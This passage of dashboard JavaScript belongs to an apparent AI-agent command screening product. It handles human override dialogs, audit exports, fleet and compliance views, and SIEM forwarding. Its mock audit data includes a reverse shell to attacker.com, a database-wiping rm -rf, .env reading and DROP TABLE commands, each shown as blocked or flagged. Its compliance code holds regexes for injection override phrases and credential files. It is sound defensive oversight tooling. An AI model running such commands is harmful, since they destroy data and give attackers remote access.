        if (overrideRes.body.warning_level === 'critical') {
            toast('warn', 'Critical Override Logged', 'High-risk action override recorded immutably.');
        } else {
            toast('success', 'Override Saved', 'Database audit log entry updated.');
        }
        refresh();
      } else {
        toast('warn', 'Override Failed', overrideRes.body?.detail || 'Database write rejected.');
      }
    }
  };

  document.getElementById('dashPg-rejectBtn').onclick = async () => {
    if (!currentActionId) return;
    // FIX: Add confirmation dialog before rejecting — matches approve friction
    if (!confirm('⚠ Confirm Termination\n\nYou are about to permanently block this action and seal a WARN_REJECTED entry in the immutable audit chain. This cannot be undone. Continue?')) {
      return;
    }
    decision.className = 'review-decision show rejected';
    decision.innerHTML = `<span>×</span><span>Block manual confirmation. Verdict override set to WARNING(REJECTED).</span>`;
    actions.classList.remove('show');
    toast('warn', 'Action Rejected', 'Override record requested.');
    
    if (sessionStorage.getItem('rk_preview_mode') === 'true') {
      const match = audit.find(e => e.action_id === currentActionId);
      if (match) match.verdict = 'WARN_REJECTED';
      renderAudit();
      renderOverview();
      toast('warn', 'Override saved', 'Local mock audit logs updated.');
    } else {
      const overrideRes = await rk.call('/v1/override', {
        method: 'POST',
        body: JSON.stringify({ action_id: currentActionId, decision: 'rejected' })
      });
      if (overrideRes.ok) {
        toast('success', 'Override Saved', 'Database audit log entry updated.');
        refresh();
      } else {
        toast('warn', 'Override Failed', overrideRes.body?.detail || 'Database write rejected.');
      }
    }
  };

  document.getElementById('auditRefresh').onclick = () => refresh();
  document.getElementById('auditVerdict').onchange = renderAudit;
  document.getElementById('auditSearch').oninput   = renderAudit;

  // ── Fetch + render ─────────────────────────────────────────────────────────
  let _refreshInFlight = false;

  async function refresh() {
    if (_refreshInFlight) return;
    if (document.visibilityState === 'hidden') return;
    _refreshInFlight = true;
    try {
      if (sessionStorage.getItem('rk_preview_mode') === 'true') {
        me = {
          name: "Operator",
          email: "operator@realitykernel.dev",
          company: "Reality Kernel SOC",
          plan: "ELITE",
          status: "active",
          created_at: new Date(Date.now() - 30*86400000).toISOString(),
          key_masked: "rk_client_…demo",
          credits_used: 1240,
          credits_limit: 5000,
          credits_remaining: 3760,
          pct_used: 24.8,
          low_credits: false,
          top_up_log: [
            {ts: Date.now()/1000 - 86400*5, amount: 5000, note: "Enterprise Provisioning"},
            {ts: Date.now()/1000 - 86400*2, amount: 1000, note: "Tier Upgrade Credit Adjust"}
          ]
        };
        if (audit.length === 0) {
          audit = [
            { ts: Date.now()/1000 - 30, verdict: "ALLOW", confidence: 0.99, command: "ls /var/log", prime_intent: "organise log files into dated folders", cost: 1, proof_hash: "3a8f9c1b2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a", action_id: "act_101", evidence: ["Fast-path validation matches command template"] },
            { ts: Date.now()/1000 - 600, verdict: "WARN_APPROVED", confidence: 0.72, command: "cat /etc/.env", prime_intent: "show me the last 10 lines of the error log", cost: 5, proof_hash: "f2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3", action_id: "act_102", evidence: ["Accessing environment files", "Prime intent mismatch (stated error log, requested .env)"] },
            { ts: Date.now()/1000 - 3600, verdict: "BLOCK", confidence: 0.94, command: "rm -rf /var/lib/db && echo 'done'", prime_intent: "summarise the app logs", cost: 5, proof_hash: "bc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d", action_id: "act_103", evidence: ["Basin B Transition: Destructive directory removal", "Destruction of databases", "Prime intent obfuscation detected"] },
            { ts: Date.now()/1000 - 7200, verdict: "BLOCK", confidence: 0.98, command: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", prime_intent: "check server connectivity", cost: 5, proof_hash: "8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e", action_id: "act_104", evidence: ["Reverse shell TCP redirection", "Causal transition to hostile shell environment"] },
            { ts: Date.now()/1000 - 86400, verdict: "WARN_REJECTED", confidence: 0.81, command: "DROP TABLE users; DELETE FROM transactions;", prime_intent: "run the database migration script", cost: 5, proof_hash: "2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b", action_id: "act_105", evidence: ["DDL table dropping command", "Delete from transactional records", "Manual block confirmation by human operator"] }
          ];
        }
      } else {
        const results = await Promise.all([
          rk.call('/v1/me'),
          rk.call('/v1/audit?limit=100'),
        ]);
        if (results[0].ok) me = results[0].body;
        if (results[1].ok) audit = results[1].body?.entries || [];
      }
      renderWarningBar();
      renderOverview();
      renderUsage();
      renderAudit();
      renderProfile();
      renderAgentFleet();
      renderCompliance();
      forwardNewEventsToSIEM();
      
      const overlay = document.getElementById('loadingOverlay');
      if (overlay) {
        overlay.style.opacity = 0;
        setTimeout(() => overlay.remove(), 400);
      }
    } finally {
      _refreshInFlight = false;
    }
  }

  // Handle Approve/Reject clicks from the Pending Alerts card in the Overview tab.
  // FIX: Previously fired the API with zero confirmation, silently bypassing the
  //      step-up challenge that dashPg-approveBtn correctly enforces. Now unified.
  window.handleOverride = async function(action_id, decision) {
    const match = audit.find(e => e.action_id === action_id);
    const isApprove = decision === 'approved';

    if (isApprove) {
      if (match && match.confidence >= 0.60) {
        if (!confirm('STEP-UP CHALLENGE REQUIRED\n\nThis action was flagged as HIGH RISK (' + Math.round((match.confidence || 0) * 100) + '% confidence). Authorizing it will trigger a critical, immutable log line in your security audit. Are you absolutely sure you want to override the Reality Kernel Engine?')) {
          return;
        }
      } else {
        if (!confirm('⚠ This action was flagged as suspicious by the Reality Kernel. Are you sure you want to override the engine\'s assessment?')) {
          return;
        }
      }
    } else {
      if (!confirm('⚠ Confirm Termination\n\nYou are about to permanently block this action and seal a WARN_REJECTED entry in the immutable audit chain. This cannot be undone. Continue?')) {
        return;
      }
    }

    try {
      const res = await rk.call('/v1/override', {
        method: 'POST',
        body: JSON.stringify({ action_id, decision })
      });
      if (res.ok) {
        // FIX: Mark as resolved locally so WARN card dismisses immediately
        _resolvedWarns.add(action_id);
        toast(isApprove ? 'success' : 'warn', 'Override Applied', isApprove ? 'Action approved and audit log updated.' : 'Action blocked and audit log updated.');
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('action_id') === action_id) {
          window.history.replaceState({}, document.title, window.location.pathname);
        }
        // Re-render overview immediately so WARN card removes right away
        renderOverview();
        await refresh();
      } else {
        // FIX: showToast was undefined — replaced with toast()
        toast('warn', 'Override Failed', res.body?.detail || 'API request rejected.');
      }
    } catch (e) {
      toast('warn', 'Network Error', 'Could not reach the API. Please try again.');
    }
  };

  refresh();
  setInterval(refresh, 30000);
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') refresh();
  });

  // ── NEW: Export helpers ────────────────────────────────────────────────────
  // These functions only read the in-memory `audit` array — zero backend calls.

  function triggerDownload(filename, content, mimeType) {
    const blob = new Blob([content], { type: mimeType });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = filename;
    document.body.appendChild(a); a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  function getVisibleAuditRows() {
    // Respect the current verdict filter and search query so the export matches
    // exactly what the operator sees on screen.
    const v = (document.getElementById('auditVerdict')?.value || '');
    const q = (document.getElementById('auditSearch')?.value || '').toLowerCase();
    return audit.filter(e =>
      (!v || e.verdict === v ||
        (v === 'WARN' && (e.verdict === 'WARN_APPROVED' || e.verdict === 'WARN_REJECTED'))) &&
      (!q || (e.command || '').toLowerCase().includes(q))
    );
  }

  // Helper to parse dates safely from both UNIX seconds/milliseconds and ISO strings
  function parseDateSafely(ts) {
    if (!ts) return new Date();
    const d = (typeof ts === 'number' || !isNaN(Number(ts)))
      ? new Date(Number(ts) * (Number(ts) < 10000000000 ? 1000 : 1)) // seconds vs ms check
      : new Date(ts);
    return isNaN(d.getTime()) ? new Date() : d;
  }

  // ── Download as CSV ────────────────────────────────────────────────────────
  const exportCsvBtn = document.getElementById('exportCsvBtn');
  if (exportCsvBtn) {
    exportCsvBtn.addEventListener('click', () => {
      const rows = getVisibleAuditRows();
      if (!rows.length) { showToast('No audit entries to export.', 'warn'); return; }
      const headers = ['timestamp','verdict','confidence','command','prime_intent','credits_cost','proof_hash','action_id','orchestrator_id','subagent_id'];
      const csv = [
        headers.join(','),
        ...rows.map(e => [
          parseDateSafely(e.ts).toISOString(),
          e.verdict || '',
          e.confidence !== undefined ? ((Number(e.confidence) || 0) * 100).toFixed(1) + '%' : '—',
          '"' + (e.command  || '').replace(/"/g, '""') + '"',
          '"' + (e.prime_intent || '').replace(/"/g, '""') + '"',
          e.cost ?? '',
          e.proof_hash || '',
          e.action_id  || '',
          e.orchestrator_id || '',
          e.subagent_id     || ''
        ].join(','))
      ].join('\n');
      const ts = new Date().toISOString().slice(0, 10);
      triggerDownload(`rk_audit_${ts}.csv`, csv, 'text/csv');
      showToast('Audit log exported as CSV.', 'success');
    });
  }

  // ── Download as JSON ───────────────────────────────────────────────────────
  const exportJsonBtn = document.getElementById('exportJsonBtn');
  if (exportJsonBtn) {
    exportJsonBtn.addEventListener('click', () => {
      const rows = getVisibleAuditRows();
      if (!rows.length) { showToast('No audit entries to export.', 'warn'); return; }
      const payload = {
        exported_at: new Date().toISOString(),
        key_masked:  me?.key_masked || '—',
        total_entries: rows.length,
        entries: rows
      };
      const ts = new Date().toISOString().slice(0, 10);
      triggerDownload(`rk_audit_${ts}.json`, JSON.stringify(payload, null, 2), 'application/json');
      showToast('Audit log exported as JSON.', 'success');
    });
  }

  // ── Download individual cryptographic receipt ──────────────────────────────
  // `_currentReceiptEntry` is set by showAuditDetail when a row is opened.
  let _currentReceiptEntry = null;
  const _origShowAuditDetail = window.showAuditDetail;
  window.showAuditDetail = function(entry) {
    _currentReceiptEntry = entry;
    _origShowAuditDetail(entry);
  };

  const downloadReceiptBtn = document.getElementById('downloadReceiptBtn');
  if (downloadReceiptBtn) {
    downloadReceiptBtn.addEventListener('click', () => {
      if (!_currentReceiptEntry) { showToast('No receipt selected.', 'warn'); return; }
      const receipt = {
        rk_receipt_version: '1.0',
        exported_at: new Date().toISOString(),
        action_id:   _currentReceiptEntry.action_id,
        timestamp:   parseDateSafely(_currentReceiptEntry.ts).toISOString(),
        verdict:     _currentReceiptEntry.verdict,
        confidence:  _currentReceiptEntry.confidence,
        command:     _currentReceiptEntry.command,
        prime_intent: _currentReceiptEntry.prime_intent,
        evidence:    _currentReceiptEntry.evidence,
        proof_hash:  _currentReceiptEntry.proof_hash,
        orchestrator_id: _currentReceiptEntry.orchestrator_id || null,
        subagent_id:     _currentReceiptEntry.subagent_id     || null,
        session_lineage: _currentReceiptEntry.session_lineage || null
      };
      const id = (_currentReceiptEntry.action_id || 'receipt').replace(/[^a-z0-9_]/gi, '_');
      triggerDownload(`rk_receipt_${id}.json`, JSON.stringify(receipt, null, 2), 'application/json');
      showToast('Cryptographic receipt downloaded.', 'success');
    });
  }

  // ── NEW: Enterprise Settings handlers (frontend-only, demo-safe) ───────────
  // Kill Switch: persisted in localStorage so it survives page refresh.
  const strictToggle = document.getElementById('strictModeToggle');
  if (strictToggle) {
    // Restore saved state
    strictToggle.checked = localStorage.getItem('rk_strict_mode') === 'true';
    strictToggle.addEventListener('change', () => {
      const enabled = strictToggle.checked;
      localStorage.setItem('rk_strict_mode', String(enabled));
      if (enabled) {
        showToast('Strict Execution Mode ENABLED. All Risk Score > 100 actions will be Hard Denied.', 'warn');
      } else {
        showToast('Strict Execution Mode disabled. HITL escalation re-enabled.', 'success');
      }
    });
  }

  // Audit Retention: persisted in localStorage.
  const retentionSelect = document.getElementById('retentionSelect');
  const saveRetentionBtn = document.getElementById('saveRetentionBtn');
  if (retentionSelect && saveRetentionBtn) {
    const saved = localStorage.getItem('rk_retention_days');
    if (saved) retentionSelect.value = saved;
    saveRetentionBtn.addEventListener('click', () => {
      const days = retentionSelect.value;
      localStorage.setItem('rk_retention_days', days);
      const labels = { '30': '30 Days (Standard)', '90': '90 Days (Pro)', '2555': 'Immutable 7-Year (Enterprise)' };
      showToast('Retention policy set to: ' + (labels[days] || days + ' days') + '. Applied on next billing cycle.', 'success');
    });
  }

  // SIEM Webhook: persisted in localStorage.
  const saveSiemBtn = document.getElementById('saveSiemBtn');
  if (saveSiemBtn) {
    const siemInput = document.getElementById('siemWebhookUrl');
    if (siemInput) siemInput.value = localStorage.getItem('rk_siem_url') || '';
    saveSiemBtn.addEventListener('click', () => {
      const url = document.getElementById('siemWebhookUrl')?.value.trim() || '';
      if (url && !url.startsWith('http')) {
        showToast('Please enter a valid https:// endpoint URL.', 'warn'); return;
      }
      localStorage.setItem('rk_siem_url', url);
      if (url) {
        showToast('SIEM endpoint saved. Events will be forwarded on your next session.', 'success');
      } else {
        showToast('SIEM forwarding disabled.', 'info');
      }
    });
  }

  // ── Agent Fleet Tab ────────────────────────────────────────────────────────
  // Aggregates the `audit` array (already fetched by refresh()). No extra API calls.

  function renderAgentFleet() {
    if (!audit || !audit.length) return;
    const agentMap = {};
    audit.forEach(e => {
      // FIX: Label agents without agent_id as 'rk-default-agent' with tooltip
      const rawId = (e.agent_id || '').trim();
      const id = rawId || 'rk-default-agent';
      if (!agentMap[id]) agentMap[id] = { id, isDefault: !rawId, calls: 0, blocks: 0, warns: 0, lastSeen: 0 };
      const a = agentMap[id];
      a.calls++;
      if (e.verdict === 'BLOCK') a.blocks++;
      if (e.verdict === 'WARN' || e.verdict === 'WARN_APPROVED' || e.verdict === 'WARN_REJECTED') a.warns++;
      const ts = e.ts ? (typeof e.ts === 'number' ? e.ts : new Date(e.ts).getTime() / 1000) : 0;
      if (ts > a.lastSeen) a.lastSeen = ts;
    });
    const agents = Object.values(agentMap);
    const totalCalls = agents.reduce((s, a) => s + a.calls, 0);
    const fleetBlockRate = totalCalls > 0 ? agents.reduce((s, a) => s + a.blocks, 0) / totalCalls : 0;
    const now = Date.now() / 1000;
    const active24h = agents.filter(a => (now - a.lastSeen) < 86400).length;
    const anomalous = agents.filter(a => a.calls >= 3 && (a.blocks / a.calls) > Math.max(fleetBlockRate * 2, 0.10));
    const elById = (id) => document.getElementById(id);
    if (elById('ag-active')) elById('ag-active').textContent = active24h;
    if (elById('ag-anomalous')) elById('ag-anomalous').textContent = anomalous.length;
    if (elById('ag-total')) elById('ag-total').textContent = agents.length;
    const anomalyCard = elById('agentAnomalyCard');
    const anomalyList = elById('ag-anomaly-list');
    if (anomalyCard && anomalyList) {
      if (anomalous.length > 0) {
        anomalyCard.style.display = '';
        anomalyList.innerHTML = anomalous.map(a =>
          '<div style="display:flex;align-items:center;gap:12px;padding:10px;background:var(--bg-elev-1);border-radius:6px;border-left:3px solid var(--warn);">' +
          '<div style="font-family:var(--font-mono);font-size:12px;font-weight:600;color:var(--text);">' + esc(a.id) + '</div>' +
          '<div style="flex:1;font-size:12px;color:var(--text-2);">' + Math.round(a.blocks/a.calls*100) + '% block rate &middot; ' + a.calls + ' calls &middot; fleet avg ' + Math.round(fleetBlockRate*100) + '%</div>' +
          '<span class="pill block" style="font-size:10px;">ANOMALOUS</span></div>'
        ).join('');
      } else { anomalyCard.style.display = 'none'; }
    }
    const tbody = elById('ag-table-body');
    if (!tbody) return;
    if (!agents.length) {
      tbody.innerHTML = '<tr><td colspan="5"><div class="empty-state"><span class="empty-ic">&#8960;</span><h4>No agents found</h4><p>Send /v1/check calls with an agent_id to populate this view.</p></div></td></tr>';
      return;
    }
    agents.sort((a, b) => b.lastSeen - a.lastSeen);
    tbody.innerHTML = agents.map(a => {
      const blockRate = a.calls > 0 ? (a.blocks / a.calls * 100).toFixed(1) : '0.0';
      const isAnomaly = anomalous.includes(a);
      const lastSeenStr = a.lastSeen > 0 ? new Date(a.lastSeen * 1000).toLocaleString() : '\u2014';
      const isActive = (now - a.lastSeen) < 86400;
      const statusHtml = isAnomaly ? '<span class="pill block" style="font-size:10px;">ANOMALOUS</span>'
        : isActive ? '<span class="pill allow" style="font-size:10px;">ACTIVE</span>'
        : '<span class="pill muted" style="font-size:10px;">IDLE</span>';
      const agentLabel = a.isDefault
        ? `<div><span>${esc(a.id)}</span><div style="font-size:9px;color:var(--text-muted);font-weight:normal;text-transform:none;margin-top:2px;max-width:140px;line-height:1.2;">No agent_id passed in API call</div></div>`
        : `<span>${esc(a.id)}</span>`;
      return '<tr>' +
        '<td style="font-family:var(--font-mono);font-size:12px;">' + agentLabel + '</td>' +
        '<td style="font-size:12px;color:var(--text-2);">' + esc(lastSeenStr) + '</td>' +
        '<td style="font-size:12px;">' + a.calls + '</td>' +
        '<td style="font-size:12px;color:' + (parseFloat(blockRate)>20?'var(--block)':parseFloat(blockRate)>10?'var(--warn)':'var(--ok)') + ';">' + blockRate + '%</td>' +
        '<td>' + statusHtml + '</td></tr>';
    }).join('');
  }

  // Refresh fleet + compliance when their tabs are clicked
  document.querySelectorAll('.rk-nav-link[data-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      if (btn.dataset.tab === 'agents') renderAgentFleet();
      if (btn.dataset.tab === 'compliance') renderCompliance();
    });
  });

  // ── Compliance Mapping Tab ─────────────────────────────────────────────────
  // Maps real audit counts to OWASP LLM Top 10, NIST AI 600-1, EU AI Act.
  // Pure client-side — computed from already-fetched audit[] array.

  var COMP_CTRL = {
    owasp: [
      { id:'LLM01', name:'LLM01 \u2014 Prompt Injection',         what:'Engine blocks commands where prime_intent contains injection override patterns', count_fn: function(a){ return a.filter(function(e){ return e.verdict==='BLOCK' && (e.evidence||[]).some(function(ev){ return /injection|ignore.*instruction|disregard/i.test(ev); }); }).length; } },
      { id:'LLM02', name:'LLM02 \u2014 Insecure Output Handling',  what:'Exfiltration commands caught by Slow-Drip session chain detection',             count_fn: function(a){ return a.filter(function(e){ return (e.evidence||[]).some(function(ev){ return /exfil|slow.drip/i.test(ev); }); }).length; } },
      { id:'LLM03', name:'LLM03 \u2014 Training Data Poisoning',   what:'Audit chain integrity via tamper-evident SHA-256 proof-hash chain',             count_fn: function(a){ return a.filter(function(e){ return !!e.proof_hash; }).length; } },
      { id:'LLM06', name:'LLM06 \u2014 Sensitive Info Disclosure', what:'Blocks access to credentials, SSH keys, /etc/shadow, .env files',               count_fn: function(a){ return a.filter(function(e){ return e.verdict==='BLOCK' && (e.evidence||[]).some(function(ev){ return /sensitive|credential|passwd|shadow|\.env|id_rsa/i.test(ev); }); }).length; } },
      { id:'LLM08', name:'LLM08 \u2014 Excessive Agency',          what:'Least-Agency Policy: allowed_tools + scope restrictions enforced per call',      count_fn: function(a){ return a.filter(function(e){ return (e.evidence||[]).some(function(ev){ return /policy.*violation|scope.*violation/i.test(ev); }); }).length; } },
      { id:'LLM09', name:'LLM09 \u2014 Overreliance',              what:'HITL override workflow: WARN verdicts require human approve/reject before run',  count_fn: function(a){ return a.filter(function(e){ return e.verdict==='WARN_APPROVED'||e.verdict==='WARN_REJECTED'; }).length; } },
    ],
    nist: [
      { id:'MS-2.5',  name:'Manage \u2014 MS-2.5: Incident Log',    what:'Every /v1/check writes a tamper-evident entry to Supabase audit_log',          count_fn: function(a){ return a.length; } },
      { id:'GV-1.3',  name:'Govern \u2014 GV-1.3: AI Risk Policy',  what:'Least-Agency Policy enforced: allowed_tools, allowed_egress per session token', count_fn: function(a){ return a.filter(function(e){ return (e.evidence||[]).some(function(ev){ return /policy/i.test(ev); }); }).length; } },
      { id:'MAP-3.1', name:'Map \u2014 MAP-3.1: Context Awareness',  what:'Prime intent cross-referenced against command effect class on every call',     count_fn: function(a){ return a.filter(function(e){ return e.verdict!=='ALLOW'; }).length; } },
      { id:'ME-3.3',  name:'Measure \u2014 ME-3.3: Human Review',   what:'HITL override log: operators can approve or reject WARN-flagged actions',       count_fn: function(a){ return a.filter(function(e){ return e.verdict==='WARN_APPROVED'||e.verdict==='WARN_REJECTED'; }).length; } },
    ],
    euai: [
      { id:'Art.9',  name:'Article 9 \u2014 Risk Management',    what:'Continuous risk evaluation: 5-world simulation on every agent action',           count_fn: function(a){ return a.filter(function(e){ return e.verdict==='BLOCK'||e.verdict==='WARN'; }).length; } },
      { id:'Art.12', name:'Article 12 \u2014 Record Keeping',    what:'Immutable audit log with SHA-256 proof-chain linkage per action',               count_fn: function(a){ return a.filter(function(e){ return !!e.proof_hash; }).length; } },
      { id:'Art.13', name:'Article 13 \u2014 Transparency',      what:'Evidence array on every decision: human-readable reason for each verdict',      count_fn: function(a){ return a.filter(function(e){ return (e.evidence||[]).length > 0; }).length; } },
      { id:'Art.14', name:'Article 14 \u2014 Human Oversight',   what:'HITL override: WARN actions gated on explicit operator approve/reject',         count_fn: function(a){ return a.filter(function(e){ return e.verdict==='WARN'; }).length; } },
      { id:'Art.17', name:'Article 17 \u2014 Quality Management', what:'Session-level behavioral tracking: cumulative risk counters per agent session', count_fn: function(a){ return a.filter(function(e){ return (e.evidence||[]).some(function(ev){ return /session rule/i.test(ev); }); }).length; } },
    ],
  };

  function _compRow(ctrl, count, matchingEntries) {
    var sat = count > 0;
    var rowId = 'comp-drill-' + ctrl.id.replace(/[^a-z0-9]/gi,'_');
    var drillHtml = '';
    if (sat && matchingEntries && matchingEntries.length > 0) {
      drillHtml = '<tr id="' + rowId + '" style="display:none;"><td colspan="4" style="padding:0;">' +
        '<div style="padding:12px 16px;background:rgba(0,255,204,0.03);border-left:3px solid var(--brand);border-bottom:1px solid var(--border);">' +
        '<div style="font-size:11px;color:var(--brand);font-family:var(--font-mono);text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Evidence Events (' + matchingEntries.length + ')</div>' +
        matchingEntries.slice(0,5).map(function(e){
          return '<div style="display:flex;gap:12px;padding:6px 0;border-bottom:1px solid var(--border);font-size:11px;align-items:center;">' +
            '<span style="color:var(--text-muted);white-space:nowrap;">' + esc(rk.fmtTime(e.ts)) + '</span>' +
            '<span class="pill ' + verdictClass(e.verdict) + '" style="font-size:10px;">' + esc(formatVerdict(e.verdict)) + '</span>' +
            '<span style="font-family:var(--font-mono);color:var(--text-soft);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' +
              (e.command && e.command.startsWith('[redacted]') ? '[redacted] ' + esc(e.command.replace('[redacted] ','').slice(0,40)) : esc((e.command||'').slice(0,40))) +
            '</span></div>';
        }).join('') +
        (matchingEntries.length > 5 ? 
          '<div style="font-size:11px;color:var(--text-muted);padding-top:6px;cursor:pointer;" onclick="this.style.display=\'none\'; this.nextElementSibling.style.display=\'block\';">+ ' + (matchingEntries.length-5) + ' more events (click to expand)</div>' + 
          '<div style="display:none;">' + 
            matchingEntries.slice(5).map(function(e){
              return '<div style="display:flex;gap:12px;padding:6px 0;border-bottom:1px solid var(--border);font-size:11px;align-items:center;">' +
                '<span style="color:var(--text-muted);white-space:nowrap;">' + esc(rk.fmtTime(e.ts)) + '</span>' +
                '<span class="pill ' + verdictClass(e.verdict) + '" style="font-size:10px;">' + esc(formatVerdict(e.verdict)) + '</span>' +
                '<span style="font-family:var(--font-mono);color:var(--text-soft);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' +
                  (e.command && e.command.startsWith('[redacted]') ? '[redacted] ' + esc(e.command.replace('[redacted] ','').slice(0,40)) : esc((e.command||'').slice(0,40))) +
                '</span></div>';
            }).join('') +
          '</div>'
        : '') +
        '</div></td></tr>';
    }
    var toggleAttr = sat ? ' style="cursor:pointer;" onclick="(function(r){var el=document.getElementById(\'' + rowId + '\');if(el){el.style.display=el.style.display===\'none\'?\'\':\'none\';}})()"' : '';
    return '<tr' + toggleAttr + '>' +
      '<td style="font-size:12px;font-weight:600;font-family:var(--font-mono);">' + esc(ctrl.name) + (sat ? ' <span style="font-size:9px;color:var(--text-muted);">▸</span>' : '') + '</td>' +
      '<td style="font-size:12px;color:var(--text-2);max-width:320px;">' + esc(ctrl.what) + '</td>' +
      '<td style="font-size:12px;text-align:center;">' + count + '</td>' +
      '<td style="text-align:center;">' + (sat ? '<span class="pill allow" style="font-size:10px;">SATISFIED</span>' : '<span class="pill muted" style="font-size:10px;">NO DATA</span>') + '</td></tr>' +
      drillHtml;
  }

  function renderCompliance() {
    if (!audit) return;
    var blocks  = audit.filter(function(e){ return e.verdict==='BLOCK'; }).length;
    var reviews = audit.filter(function(e){ return e.verdict==='WARN_APPROVED'||e.verdict==='WARN_REJECTED'; }).length;
    var owaspC = COMP_CTRL.owasp.map(function(c){ return { ctrl:c, count:c.count_fn(audit) }; });
    var nistC  = COMP_CTRL.nist.map(function(c){  return { ctrl:c, count:c.count_fn(audit) }; });
    var euaiC  = COMP_CTRL.euai.map(function(c){  return { ctrl:c, count:c.count_fn(audit) }; });
    var all    = owaspC.concat(nistC).concat(euaiC);
    var satisfied = all.filter(function(x){ return x.count > 0; }).length;
    var g = function(id){ return document.getElementById(id); };
    if (g('comp-satisfied')) g('comp-satisfied').textContent = satisfied + '/' + all.length;
    if (g('comp-blocks'))    g('comp-blocks').textContent    = blocks;
    if (g('comp-reviews'))   g('comp-reviews').textContent   = reviews;
    if (g('comp-owasp-body')) g('comp-owasp-body').innerHTML = owaspC.map(function(x){ var m=audit.filter(function(e){return x.ctrl.count_fn([e])>0;}); return _compRow(x.ctrl, x.count, m); }).join('');
    if (g('comp-nist-body'))  g('comp-nist-body').innerHTML  = nistC.map(function(x){ var m=audit.filter(function(e){return x.ctrl.count_fn([e])>0;}); return _compRow(x.ctrl, x.count, m); }).join('');
    if (g('comp-euai-body'))  g('comp-euai-body').innerHTML  = euaiC.map(function(x){ var m=audit.filter(function(e){return x.ctrl.count_fn([e])>0;}); return _compRow(x.ctrl, x.count, m); }).join('');
  }

  var exportComplianceBtn = document.getElementById('exportComplianceBtn');
  if (exportComplianceBtn) {
    exportComplianceBtn.addEventListener('click', function() {
      if (!audit.length) { showToast('Load audit data first.', 'warn'); return; }
      var report = {
        rk_compliance_report_version: '1.0',
        generated_at: new Date().toISOString(),
        account: me ? me.key_masked : '\u2014',
        audit_entries_analyzed: audit.length,
        frameworks: {
          owasp_llm_top10: COMP_CTRL.owasp.map(function(c){ return { control:c.name, enforced_by:c.what, evidence_count:c.count_fn(audit), status:c.count_fn(audit)>0?'SATISFIED':'NO_DATA' }; }),
          nist_ai_600_1:   COMP_CTRL.nist.map(function(c){  return { control:c.name, enforced_by:c.what, evidence_count:c.count_fn(audit), status:c.count_fn(audit)>0?'SATISFIED':'NO_DATA' }; }),
          eu_ai_act:       COMP_CTRL.euai.map(function(c){  return { control:c.name, enforced_by:c.what, evidence_count:c.count_fn(audit), status:c.count_fn(audit)>0?'SATISFIED':'NO_DATA' }; }),
        }
      };
      var ts = new Date().toISOString().slice(0,10);
      triggerDownload('rk_compliance_report_' + ts + '.json', JSON.stringify(report, null, 2), 'application/json');
      showToast('Compliance report exported.', 'success');
    });
  }

  // ── SIEM Real Forwarding ───────────────────────────────────────────────────
  // Replaces the previous localStorage-only stub with actual fetch() calls.
  // Tracks forwarded action_ids in sessionStorage to prevent duplicate sends.

  var _siemForwarded = new Set(JSON.parse(sessionStorage.getItem('rk_siem_fwd') || '[]'));

  function _siemPost(url, payload) {
    try {
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      });
    } catch(_) { /* Silent fail: SIEM unavailability must not break the dashboard */ }
  }

  function forwardNewEventsToSIEM() {
    var siemUrl = localStorage.getItem('rk_siem_url') || '';
    if (!siemUrl || !siemUrl.startsWith('http')) return;
    var filter = localStorage.getItem('rk_siem_filter') || 'BLOCK_WARN';
    audit.forEach(function(e) {
      if (!e.action_id || _siemForwarded.has(e.action_id)) return;
      var v = e.verdict || '';
      var shouldSend = filter === 'ALL' ||
        (filter === 'BLOCK_WARN' && (v==='BLOCK'||v==='WARN'||v==='WARN_APPROVED'||v==='WARN_REJECTED')) ||
        (filter === 'BLOCK' && v === 'BLOCK');
      if (!shouldSend) return;
      _siemForwarded.add(e.action_id);
      var ts = e.ts ? new Date(typeof e.ts === 'number' ? e.ts * 1000 : e.ts).toISOString() : new Date().toISOString();
      _siemPost(siemUrl, {
        source: 'reality-kernel', version: '1.0',
        event_time: ts,
        action_id: e.action_id, verdict: v,
        confidence: e.confidence, evidence: e.evidence || [],
        agent_id: e.agent_id || null, session_id: e.session_id || null,
        proof_hash: e.proof_hash, credits_cost: e.cost,
      });
    });
    var arr = Array.from(_siemForwarded).slice(-500);
    try { sessionStorage.setItem('rk_siem_fwd', JSON.stringify(arr)); } catch(_) {}
  }

  // Upgrade saveSiemBtn to actually forward events and fire a test event
  var _siemSaveBtn = document.getElementById('saveSiemBtn');
  if (_siemSaveBtn) {
    var _siemInput = document.getElementById('siemWebhookUrl');
    if (_siemInput) _siemInput.value = localStorage.getItem('rk_siem_url') || '';
    // Remove the old stub listener added earlier and replace with real one
    var newBtn = _siemSaveBtn.cloneNode(true);
    _siemSaveBtn.parentNode.replaceChild(newBtn, _siemSaveBtn);
    newBtn.addEventListener('click', function() {
      var url = _siemInput ? _siemInput.value.trim() : '';
      if (url && !url.startsWith('http')) {
        showToast('Enter a valid https:// SIEM endpoint URL.', 'warn'); return;
      }
      localStorage.setItem('rk_siem_url', url);
      _siemForwarded = new Set();
      sessionStorage.removeItem('rk_siem_fwd');
      if (url) {
        _siemPost(url, { source:'reality-kernel', version:'1.0', event_time:new Date().toISOString(), action_id:'test-connection', verdict:'TEST', confidence:1.0, evidence:['Reality Kernel SIEM integration test - connection verified.'], agent_id:null, session_id:null, proof_hash:null });
        showToast('SIEM endpoint saved. Test event sent — check your SIEM receiver.', 'success');
        forwardNewEventsToSIEM();
      } else {
        showToast('SIEM forwarding disabled.', 'info');
